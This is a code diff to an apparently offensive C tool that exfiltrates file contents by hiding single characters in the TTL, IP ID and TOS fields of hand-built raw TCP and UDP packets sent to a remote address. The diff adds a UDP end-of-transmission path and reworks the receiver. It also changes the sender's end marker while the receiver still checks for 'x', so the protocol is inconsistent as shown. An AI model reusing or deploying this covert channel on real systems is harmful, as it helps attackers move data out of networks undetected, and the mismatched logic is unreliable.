@@ -82,7 +82,11 @@ void send_results(char *sip, char *dip, unsigned short sport, unsigned short dpo
     }
 
     input = 4;  //send EOT (end of transmission) character
+    if(tcp){
     covert_send(sip, dip, sport, dport, (unsigned char*) &input, 1); //send the packet
+    } else {
+        covert_udp_send(sip, dip, sport, dport, (unsigned char *) &input, 1);
+    }
 
     printf("completed\n");
     fclose(file);
@@ -93,7 +97,7 @@ int rand_delay(int delay) {
     return rand() % delay + 1;
 }
 
-void covert_udp_send_data(char *sip, char *dip, unsigned short sport, unsigned short dport, char* data, int covert_channel){
+/*void covert_udp_send_data(char *sip, char *dip, unsigned short sport, unsigned short dport, char* data, int covert_channel){
     unsigned char *buf = 0;
     covert_udp_send(sip,dip,sport,dport,(unsigned char*) buf,4);
     sleep(1);
@@ -105,7 +109,8 @@ void covert_udp_send_data(char *sip, char *dip, unsigned short sport, unsigned s
     //end of file
     covert_udp_send(sip,dip,sport,dport,buf, 3);
 
-}
+}*/
+
 void covert_udp_send(char *sip, char *dip, unsigned short sport, unsigned short dport, unsigned char* data, int covert_channel){
     char datagram[4096] , source_ip[32] , *pseudoheader;
     int sending_socket;
@@ -140,10 +145,10 @@ void covert_udp_send(char *sip, char *dip, unsigned short sport, unsigned short 
         ip_header->id = 'l';  //enter a single ASCII character into the field
         ip_header->tos = 'b';
     }else if(covert_channel == 3){
-        //end of command
-        ip_header->ttl = 'x';
-        ip_header->id = 'x';  //enter a single ASCII character into the field
-        ip_header->tos = 'x';
+        //close the connection
+        ip_header->ttl = 4;
+        ip_header->id = 0;  //enter a single ASCII character into the field
+        ip_header->tos = 0;
     }else if(covert_channel == 4){
         ip_header->ttl = 'r';
         ip_header->id = 'r';  //enter a single ASCII character into the field
@@ -318,40 +323,36 @@ void covert_send(char *sip, char *dip, unsigned short sport, unsigned short dpor
     printf("Sending Data(%d)\n\n\n", bytes_sent);
 }
 char covert_udp_recv(char *sip, int sport, bool ttl, bool tos, bool ipid) {
+    struct sockaddr_in sin;
     int recv_socket, n, bytes_recv;
     unsigned int sip_binary;
-    //struct recv_tcp recv_packet;
-    sip_binary = host_convert(sip);
     char datagram[4096];
-
-    if((n = recv_socket = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0) {
-        perror("receiving socket failed to open (root maybe required)");
-    }
-
-    //bytes_recv = read(recv_socket, datagram, 4096);
-    struct sockaddr_in sin;
     socklen_t socklen;
+    sip_binary = host_convert(sip);
+
+    memset(datagram, 0, sizeof(datagram));
+
     sin.sin_family = AF_INET;
     sin.sin_port = htons(8505);
     sin.sin_addr.s_addr = inet_addr(sip);
     socklen = (socklen_t) sizeof(sin);
+
+    if((n = recv_socket = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0) {
+        perror("receiving socket failed to open (root maybe required)");
+    }
 
     if(bind(recv_socket, (struct sockaddr*) &sin, socklen) == -1){
         perror("bind");
         exit(1);
     }
 
-    memset(datagram, 0, sizeof(datagram));
-
     if((bytes_recv = recv(recv_socket, datagram, sizeof(datagram), 0)) == -1){
         perror("recv");
         exit(1);
     }
 
-
     close(recv_socket);
     struct iphdr *ip_header = (struct iphdr *) datagram;
-    //struct udphdr *udp_header = (struct udphdr *) (datagram + sizeof (struct iphdr));
 
     if(ip_header->ttl == 'x' && ip_header->tos == 'x' && ip_header->id == 'x'){
         return -1;
